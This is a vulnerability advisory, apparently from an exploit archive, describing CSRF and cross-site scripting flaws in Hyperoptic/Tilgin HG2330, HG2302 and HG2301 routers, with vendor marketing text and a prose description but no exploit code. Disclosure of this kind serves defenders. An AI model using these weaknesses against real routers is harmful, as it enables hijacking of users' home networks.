Hyperoptic (Tilgin) Router HG23xx Multiple XSS And CSRF Vulnerabilities


Vendor: Hyperoptic Ltd. | Tilgin AB
Product web page: http://www.hyperoptic.com
                  http://www.tilgin.com
Affected version: HG2330, HG2302 and HG2301

Summary: Tilgin's HG23xx family of products offers a flexible and
high capacity product in a tiny form factor. When having the product
in your hands, do not get fooled by its mere size. The product offers
full gigabit routing and a state of the art superior WLAN solution.
It runs all services offered with Tilgin HGA and is prepared for all
foreseeable future services. The product is also offered in an entry
level version with fast Ethernet LAN ports, still with gigabit Ethernet
WAN. The routing capacity and excellent WLAN remains the same also on
this model, the only limit being the fast Ethernet LAN ports.

Desc: The application allows users to perform certain actions via HTTP
requests without performing any validity checks to verify the requests.
This can be exploited to perform certain actions with administrative
privileges if a logged-in user visits a malicious web site. XSS issues
were also discovered. The issue is triggered when input passed via multiple
POST and GET parameters are not properly sanitized before being returned
to the user. This can be exploited to execute arbitrary HTML and script
code in a user's browser session in context of an affected site.
